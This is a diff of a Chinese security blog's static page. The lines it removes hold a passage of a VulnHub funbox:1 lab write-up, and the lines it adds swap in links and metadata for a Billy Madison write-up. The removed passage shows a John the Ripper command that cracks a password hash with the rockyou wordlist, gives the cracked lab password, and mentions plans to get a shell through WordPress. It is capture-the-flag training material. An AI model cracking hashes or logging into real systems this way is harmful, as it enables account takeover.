-<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4bd2db2cd64b31a2b16c6.png" srcset="/img/loading.gif" lazyload></p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure>
-<ul>
-<li><code>pass.txt</code> 将要破解的hash值写入一个文本文件</li>
-<li><code>--wordlist=</code> 指定密码字典为kali共享目录下的rockyou字典<blockquote>
-<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/820ac9f18fdb94c6a0373.png" srcset="/img/loading.gif" lazyload></p>
-</blockquote>
-</li>
-</ul>
-<p>爆破出来后我们可以看到是<code>iubire</code>，拿去登录看看</p>
-<blockquote>
-<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/90b8aaa87687692b46389.png" srcset="/img/loading.gif" lazyload></p>
-</blockquote>
-<p>成功登录后我们可以试着看能不能用wp的漏洞去getshell，但是很显然在这里应该是拿不到root权限的，最多拿一个普通shell，或者说普通shell都拿不到<br>具体咋样还有待后续的尝试<br><em>待续</em></p>
-<h1 id="📖-推荐文章"><a href="#📖-推荐文章" class="headerlink" title="📖 推荐文章"></a>📖 推荐文章</h1><p>国外大佬关于funbox:1的wp:<a target="_blank" rel="noopener" href="https://tiagotavares.io/2020/08/funbox-1-vulnhub/#-foothold">funbox:1</a><br>rbash逃逸的方法:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7642">rbash逃逸</a><br>funbox:1靶机下载地址:<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/funbox-1,518/">下载</a></p>
+<h1 id="📖-推荐文章"><a href="#📖-推荐文章" class="headerlink" title="📖 推荐文章"></a>📖 推荐文章</h1><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/billy-madison-11,161/">Billy Madison下载</a><br><a target="_blank" rel="noopener" href="https://documentation.meraki.com/MX/NAT_and_Port_Forwarding/Active_and_Passive_FTP_Overview_and_Configuration#:~:text=Passive%20FTP%20is%20an%20FTP,the%20connection%20to%20the%20server">ftp的passive模式</a><br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=0gQiv_pkOPw">youtube视频 wp</a></p>
 
                 
               </div>
@@ -514,8 +480,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>vulnhub-wp funbox:1</div>
-      <div>https://rightevil.github.io/vulnhub-wp-funbox1/</div>
+      <div>vulnhub-wp Billy Madison</div>
+      <div>https://rightevil.github.io/vulnhub-wp-Billy-Madison/</div>
     </div>
     <div class="license-meta">
       
@@ -527,7 +493,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年10月11日</div>
+          <div>2023年12月13日</div>
         </div>
       
       
@@ -559,9 +525,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/vulnhub-wp-Billy-Madison/" title="vulnhub-wp Billy Madison">
+                      <a href="/vulnhub-wp-Bob-1-0-1/" title="vulnhub-wp Bob 1.0.1">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">vulnhub-wp Billy Madison</span>
+                        <span class="hidden-mobile">vulnhub-wp Bob 1.0.1</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -569,8 +535,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/Linux%E4%BD%BF%E7%94%A8clash%E7%AE%80%E4%BE%BF%E6%96%B9%E6%B3%95/" title="Linux使用clash简便方法">
-                        <span class="hidden-mobile">Linux使用clash简便方法</span>
+                      <a href="/vulnhub-wp-funbox1/" title="vulnhub-wp funbox:1">
+                        <span class="hidden-mobile">vulnhub-wp funbox:1</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
